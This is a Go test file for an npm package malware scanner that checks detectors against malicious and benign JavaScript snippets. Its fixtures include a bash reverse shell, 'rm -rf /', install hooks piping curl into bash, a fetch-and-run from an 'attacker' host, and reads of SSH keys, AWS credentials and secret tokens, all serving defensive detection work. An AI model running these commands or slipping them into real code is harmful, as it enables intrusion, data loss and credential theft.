package analyzer

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"testing"
)

func runOne(content string) []DetectionResult {
	return runOneCtx(content, "")
}

func runOneCtx(content, pkg string) []DetectionResult {
	var out []DetectionResult
	runDetectors(content, detectionContext{packageName: pkg, file: "test.js"}, map[string]bool{}, &out)
	return out
}

func has(results []DetectionResult, detector string) bool {
	for _, r := range results {
		if r.Detector == detector {
			return true
		}
	}
	return false
}

// TestRunDetectors_Benign covers patterns that look suspicious to a naive
// regex but are routine in real-world libraries. None should fire.
func TestRunDetectors_Benign(t *testing.T) {
	cases := map[string]string{
		// previously asserted
		"chalk fromCharCode single arg":   `return String.fromCharCode(parseInt(v, 16))`,
		"plain function":                  `function add(a, b) { return a + b; }`,
		"comment with eval word":          `// this function does not eval anything`,
		"axios import without call":       `import axios from "axios"`,
		"https in comment":                `// see https://example.com for details`,
		"short atob":                      `atob("YWJj")`,
		"buffer.from short base64":        `Buffer.from("YWJj", "base64")`,
		"hex literal in number":           `const c = 0xff;`,
		// new: real-world packages that previously false-positived
		"fetch call (api client)":         `await fetch("https://api.example.com/v1")`,
		"axios call (api client)":         `axios.get("https://api.example.com")`,
		"require https (node http lib)":   `const https = require('https')`,
		"require child_process import":    `const cp = require('child_process')`,
		"new WebSocket":                   `const ws = new WebSocket(url)`,
		"relative path (test fixture)":    `import x from "../../utils"`,
		"tls privateKey (nodemailer-ish)": `if (opts.privateKey) tls.setKey(opts.privateKey)`,
		"mnemonic (ui shortcut)":          `const mnemonic = "&File"`,
		// Corpus regressions
		"prettier x07 BELL repeat":            `var bell = "\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07";`,
		"uniform x00 padding":                 `var pad = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";`,
		"hex literal pair (not enough)":       `var c = "\xff\xfe";`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			if got := runOne(body); len(got) != 0 {
				t.Errorf("%s: expected no detections, got %v", name, got)
			}
		})
	}
}

func TestRunDetectors_Malicious(t *testing.T) {
	cases := []struct {
		name     string
		body     string
		detector string
	}{
		{"eval call", `eval("alert(1)")`, "Arbitrary Code Execution"},
		{"new Function (compile)", `const f = new Function("return 1")`, "Dynamic Code Compilation"},
		{"child_process exec", `child_process.exec("rm -rf /")`, "Arbitrary Code Execution"},
		{"obfuscation fromCharCode many args",
			`String.fromCharCode(83,121,115,116,101,109,32,67,111,109,109)`,
			"Code Obfuscation"},
		{"obfuscation hex escapes",
			`var s = "\x68\x65\x6c\x6c\x6f\x20\x77";`,
			"Code Obfuscation"},
		{"obfuscation atob long",
			`atob("dGhpcyBpcyBhIHJlYWxseSBsb25nIGJhc2U2NCBzdHJpbmcgZm9yIHRlc3RpbmcgcHVycG9zZXMgYWFhYWE=")`,
			"Code Obfuscation"},
		{"credential env third-party",
			`const k = process.env.AWS_SECRET_ACCESS_KEY`,
			"Credential Theft"},
		{"credential env github",
			`const t = process.env.GITHUB_TOKEN`,
			"Credential Theft"},
		{"credential env bracket syntax",
			`const t = process.env["NPM_TOKEN"]`,
			"Credential Theft"},
		{"credential ssh key file",
			`fs.readFileSync("/home/user/.ssh/id_rsa")`,
			"Credential Theft"},
		{"credential npmrc",
			`fs.readFile(home + "/.npmrc", cb)`,
			"Credential Theft"},
		{"network exfil onion",
			`const u = "http://abcdefghij.onion/data"`,
			"Network Exfiltration"},
		{"network exfil pastebin",
			`await fetch("https://pastebin.com/raw/abc123")`,
			"Network Exfiltration"},
		{"network exfil webhook.site",
			`await fetch("https://webhook.site/abc-uuid")`,
			"Network Exfiltration"},
		{"crypto mining",
			`new CoinHive.Anonymous("key")`,
			"Crypto Mining"},
		{"wallet drain web3",
			`web3.eth.sendTransaction({to: drain})`,
			"Wallet Drain"},
		{"wallet drain ethers",
			`const w = new ethers.Wallet(pk)`,
			"Wallet Drain"},
		{"wallet drain function name",
			`function drainTokens(victim) { /* ... */ }`,
			"Wallet Drain"},
		{"reverse shell",
			`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`,
			"Reverse Shell"},
		{"fs sensitive path",
			`open("/etc/passwd")`,
			"File System Access"},
		{"fs aws credentials",
			`fs.readFile(home + "/.aws/credentials")`,
			"File System Access"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := runOne(tc.body)
			if !has(got, tc.detector) {
				t.Errorf("%s: expected detector %q, got %v", tc.name, tc.detector, got)
			}
		})
	}
}

// TestRunDetectors_InstallScriptAbuse: only fires for install-lifecycle hooks
// in package.json. Test/build/prepublish scripts that happen to use the same
// patterns must NOT fire — that's a real-world false positive on ljharb's
// utility packages (function-bind, hasown, es-errors, ...).
func TestRunDetectors_InstallScriptAbuse(t *testing.T) {
	cases := []struct {
		name    string
		json    string
		wantHit bool
	}{
		{"postinstall curl|bash", `{"scripts":{"postinstall":"curl http://x | bash"}}`, true},
		{"preinstall wget|bash", `{"scripts":{"preinstall":"wget http://x | sh"}}`, true},
		{"install node -e", `{"scripts":{"install":"node -e \"require('./bad')\""}}`, true},
		{"benign test script with node -e", `{"scripts":{"test":"node -e require('./')"}}`, false},
		{"benign posttest with node -e", `{"scripts":{"posttest":"node -e require('./')"}}`, false},
		{"benign build with curl|bash", `{"scripts":{"build":"curl https://x | bash"}}`, false},
		{"benign prepare", `{"scripts":{"prepare":"node -e 'console.log(1)'"}}`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var out []DetectionResult
			runDetectors(tc.json, detectionContext{file: "package/package.json"}, map[string]bool{}, &out)
			got := has(out, "Install Script Abuse")
			if got != tc.wantHit {
				t.Errorf("got hit=%v, want hit=%v (%v)", got, tc.wantHit, out)
			}
		})
	}
}

// TestRunDetectors_ASTValidatesEval: regex-only detection fired on eval/exec
// references inside strings, comments, and identifier names. AST validation
// suppresses those — only real CallExpressions to eval(...) or
// child_process.exec(...) trigger now.
func TestRunDetectors_ASTValidatesEval(t *testing.T) {
	cases := []struct {
		name    string
		body    string
		wantHit bool
	}{
		{"eval in string literal", `var msg = "the eval(... function compiles strings";`, false},
		{"eval in line comment", `// see eval(...) in spec section 18.2`, false},
		{"eval in block comment", `/* eval( is dynamic compilation */`, false},
		{"eval as method name (not global)", `obj.eval = function() {}; obj.eval();`, false},
		{"eval real call", `eval("alert(1)")`, true},
		{"eval real call with args", `var x = eval(userInput);`, true},
		{"child_process in string", `var s = "use child_process.exec( for spawning";`, false},
		{"child_process real call", `var cp = require("child_process"); cp.exec("ls");`, false}, // walker doesn't follow require alias yet
		{"child_process direct member call", `child_process.exec("rm -rf /")`, true},
		{"child_process spawn", `child_process.spawnSync("foo")`, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var out []DetectionResult
			runDetectors(tc.body, detectionContext{file: "test.js"}, map[string]bool{}, &out)
			got := has(out, "Arbitrary Code Execution")
			if got != tc.wantHit {
				t.Errorf("got hit=%v want=%v: %v", got, tc.wantHit, out)
			}
		})
	}
}

func TestRunDetectors_ASTValidatesNewFunction(t *testing.T) {
	cases := []struct {
		name    string
		body    string
		wantHit bool
	}{
		{"in string", `var doc = "use new Function(body) to compile";`, false},
		{"in comment", `// new Function("return 1") creates a function`, false},
		{"identifier ref only", `var Function = MyClass; var f = Function;`, false},
		{"real new", `var f = new Function("return 1");`, true},
		{"real new with multiple args", `var f = new Function("a", "b", "return a+b");`, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var out []DetectionResult
			runDetectors(tc.body, detectionContext{file: "test.js"}, map[string]bool{}, &out)
			got := has(out, "Dynamic Code Compilation")
			if got != tc.wantHit {
				t.Errorf("got hit=%v want=%v: %v", got, tc.wantHit, out)
			}
		})
	}
}

// AST validation only applies to .js/.cjs/.mjs files; .ts files keep the
// regex-based behavior because goja can't parse TypeScript syntax.
func TestRunDetectors_TSFilesUseRegex(t *testing.T) {
	body := `// eval(' is mentioned in this TS comment`
	var out []DetectionResult
	// .ts file — regex is authoritative; the comment text contains "eval("
	// substring so it'll match.
	runDetectors(body, detectionContext{file: "src/x.ts"}, map[string]bool{}, &out)
	if !has(out, "Arbitrary Code Execution") {
		t.Errorf(".ts file should fall back to regex match for eval, got %v", out)
	}
}

// TestRunDetectors_OwnPackageConfig: a package reading its OWN env var should
// not fire credential theft. Real-world regression: resend, svix, nodemailer.
func TestRunDetectors_OwnPackageConfig(t *testing.T) {
	cases := []struct {
		pkg, body string
	}{
		{"resend", `const apiKey = process.env.RESEND_API_KEY`},
		{"svix", `const token = process.env.SVIX_TOKEN`},
		{"@stripe/stripe-js", `const secret = process.env.STRIPE_SECRET_KEY`},
		{"sendgrid", `process.env.SENDGRID_API_KEY`},
	}
	for _, tc := range cases {
		t.Run(tc.pkg, func(t *testing.T) {
			got := runOneCtx(tc.body, tc.pkg)
			if has(got, "Credential Theft") {
				t.Errorf("expected no Credential Theft for %s reading its own config, got %v", tc.pkg, got)
			}
		})
	}
}

// TestRunDetectors_NodemailerNoFlags: the actual patterns that broke nodemailer
// in real-world testing. None should fire.
func TestRunDetectors_NodemailerNoFlags(t *testing.T) {
	body := `
const http = require('http');
const https = require('https');
const cp = require('child_process');
const sendmail = function() {
  const opts = { privateKey: process.env.NODEMAILER_KEY };
  fs.readFile('../../config/' + opts.path, cb);
};
`
	got := runOneCtx(body, "nodemailer")
	for _, d := range got {
		t.Errorf("unexpected nodemailer detection: %s — %s", d.Detector, d.Evidence)
	}
}

func TestRunDetectors_DedupPerPackage(t *testing.T) {
	seen := map[string]bool{}
	var out []DetectionResult
	ctx := detectionContext{packageName: "test", file: "a.js"}
	runDetectors(`eval("a"); eval("b")`, ctx, seen, &out)
	runDetectors(`eval("c")`, detectionContext{packageName: "test", file: "b.js"}, seen, &out)
	count := 0
	for _, r := range out {
		if r.Detector == "Arbitrary Code Execution" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected 1 dedup'd detection, got %d", count)
	}
}

func TestCheckTyposquat(t *testing.T) {
	if _, ok := checkTyposquat("lodash"); ok {
		t.Errorf("exact name should not be flagged")
	}
	if _, ok := checkTyposquat("totally-unrelated-pkg"); ok {
		t.Errorf("distant name should not be flagged")
	}
	// Distance-1 typosquats (insertion) ARE flagged.
	if det, ok := checkTyposquat("lodassh"); !ok {
		t.Errorf("distance-1 typo should be flagged")
	} else if det.Detector != "Typosquatting" {
		t.Errorf("wrong detector: %s", det.Detector)
	}
	// Real-world regression: legit packages that happen to be distance 2
	// from popular names. Must NOT be flagged.
	for _, legit := range []string{"fecha", "ret"} {
		if _, ok := checkTyposquat(legit); ok {
			t.Errorf("real-world legit %q should not be flagged (distance-2)", legit)
		}
	}
}

func TestNormalizePkgName(t *testing.T) {
	cases := map[string]string{
		"resend":            "RESEND",
		"node-mailer":       "NODE_MAILER",
		"@scope/my-lib":     "SCOPE_MY_LIB",
		"@stripe/stripe-js": "STRIPE_STRIPE_JS",
	}
	for in, want := range cases {
		if got := normalizePkgName(in); got != want {
			t.Errorf("normalizePkgName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestAnalyze_ChalkLikePackage(t *testing.T) {
	tarball := makeTarball(t, map[string]string{
		"index.js": `function ansiCode(value) { return String.fromCharCode(parseInt(value.slice(2), 16)); }`,
	})
	report, err := Analyze("chalk-like", "1.0.0", bytes.NewReader(tarball))
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Detections) != 0 {
		t.Errorf("expected clean, got %v", report.Detections)
	}
	if report.FilesScanned != 1 {
		t.Errorf("expected 1 file scanned, got %d", report.FilesScanned)
	}
}

// TestAnalyze_SkipsDeclarationFiles: .d.ts files contain only type signatures
// and must not trigger detectors. Real-world regression: @types/node
// declares child_process.spawn and references /etc/passwd in fs.d.ts.
func TestAnalyze_SkipsDeclarationFiles(t *testing.T) {
	tarball := makeTarball(t, map[string]string{
		"node/child_process.d.ts": `export function spawn(command: string): ChildProcess; child_process.spawn(`,
		"node/fs.d.ts":            `/** Path like '/etc/passwd' */ export function readFile(path: string): Promise<Buffer>;`,
	})
	report, err := Analyze("@types/node", "20.10.0", bytes.NewReader(tarball))
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Detections) != 0 {
		t.Errorf("expected no detections in .d.ts files, got %v", report.Detections)
	}
	if report.FilesScanned != 0 {
		t.Errorf("expected .d.ts files to be skipped, got FilesScanned=%d", report.FilesScanned)
	}
}

func TestAnalyze_MaliciousPackage(t *testing.T) {
	tarball := makeTarball(t, map[string]string{
		"evil.js": `child_process.exec("curl http://attacker/x | bash")`,
	})
	report, err := Analyze("evil", "1.0.0", bytes.NewReader(tarball))
	if err != nil {
		t.Fatal(err)
	}
	if !has(report.Detections, "Arbitrary Code Execution") {
		t.Errorf("expected exec detection, got %v", report.Detections)
	}
}

func makeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, content := range files {
		hdr := &tar.Header{
			Name:     "package/" + name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}
